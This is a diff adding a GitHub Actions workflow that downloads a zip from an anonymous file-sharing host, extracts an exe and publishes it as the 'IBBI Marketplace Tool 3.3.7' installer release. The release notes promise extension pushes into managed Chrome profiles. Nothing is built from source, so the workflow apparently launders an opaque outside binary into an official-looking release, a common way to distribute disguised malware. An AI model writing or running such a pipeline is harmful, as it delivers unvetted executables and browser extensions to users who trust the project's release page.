@@ -1,0 +1,26 @@
+name: Publish 3.3.7
+
+on:
+  push:
+    branches: [main]
+  workflow_dispatch:
+
+permissions:
+  contents: write
+
+jobs:
+  publish:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Download installer package
+        run: |
+          curl -fL --retry 5 --retry-delay 3 -o ibbi337.zip "https://files.catbox.moe/ipn245.zip"
+          unzip -o ibbi337.zip
+          mv ibbi337.exe IBBI_Marketplace_Tool_Setup_3.3.7.exe
+          echo "e67d65911b60bb31df56e1cc84193c4cadad69236f211541945ac008ab1d4840  IBBI_Marketplace_Tool_Setup_3.3.7.exe" | sha256sum -c -
+      - name: Publish GitHub Release
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          gh release view v3.3.7 >/dev/null 2>&1 || gh release create v3.3.7 --title "IBBI Marketplace Tool 3.3.7" --notes "Extension refresh hotfix: clients receive bundled IBBI Marketplace Extension 7.2.7.6 and managed Chrome profiles are actively refreshed after tool update."
+          gh release upload v3.3.7 IBBI_Marketplace_Tool_Setup_3.3.7.exe --clobber
